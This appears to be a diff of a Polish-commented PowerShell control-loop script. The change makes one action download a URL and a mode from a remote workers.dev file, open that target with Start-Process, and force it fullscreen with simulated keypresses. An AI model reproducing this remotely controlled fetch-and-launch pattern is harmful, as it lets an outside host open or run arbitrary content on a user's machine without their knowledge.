@@ -735,15 +735,48 @@ while ($true) {
         }
         "2" {
             if (-not $youtubeStarted) {
-                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [2] Uruchamiam YT" -ForegroundColor Yellow
-                Start-Process $youtubeUrl
-                Start-Sleep 5
-                Add-Type -AssemblyName System.Windows.Forms
-                [System.Windows.Forms.SendKeys]::SendWait("f")
-                $youtubeStarted = $true
-                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] YT uruchomiony" -ForegroundColor Green
+                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [2] Pobieram konfiguracje URL..." -ForegroundColor Yellow
+                
+                $actionUrlEndpoint = "https://update.bckup.workers.dev/url.txt"
+                
+                try {
+                    $urlResponse = (Invoke-WebRequest -Uri $actionUrlEndpoint -UseBasicParsing -TimeoutSec 10).Content
+                    $lines = $urlResponse -split "`r?`n" | Where-Object { $_.Trim() -ne "" }
+                    if ($lines.Count -ge 2) {
+                        $targetUrl = $lines[0].Trim()
+                        $mode      = $lines[1].Trim()
+                        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Otwieram: $targetUrl (Tryb: $mode)" -ForegroundColor Yellow
+                        Start-Process $targetUrl
+                        switch ($mode) {
+                            "1" {
+                                # 1: Zwykłe otwarcie URL
+                                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [1] URL otwarty standardowo" -ForegroundColor Green
+                            }
+                            "2" {
+                                # 2: Otwarcie URL + F11 (pełny ekran przeglądarki)
+                                Start-Sleep -Seconds 5
+                                [System.Windows.Forms.SendKeys]::SendWait("{F11}")
+                                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [2] Aktywowano F11" -ForegroundColor Green
+                            }
+                            "3" {
+                                # 3: Otwarcie wideo jako YouTube (fullscreen klawiszem F)
+                                Start-Sleep -Seconds 5
+                                [System.Windows.Forms.SendKeys]::SendWait("f")
+                                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [3] Wideo powiekszone (F)" -ForegroundColor Green
+                            }
+                            default {
+                                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Nieznany tryb '$mode' - otwarto sam link" -ForegroundColor DarkYellow
+                            }
+                        }
+                        $youtubeStarted = $true
+                    } else {
+                        Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Plik url.txt nie zawiera 2 linii!" -ForegroundColor Red
+                    }
+                } catch {
+                    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Blad pobierania url.txt: $_" -ForegroundColor Red
+                }
             } else {
-                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [2] YT juz uruchomiony, pomijam" -ForegroundColor Gray
+                Write-Host "[$(Get-Date -Format 'HH:mm:ss')] [2] Akcja URL juz wykonana, pomijam" -ForegroundColor Gray
             }
         }
         "3" {
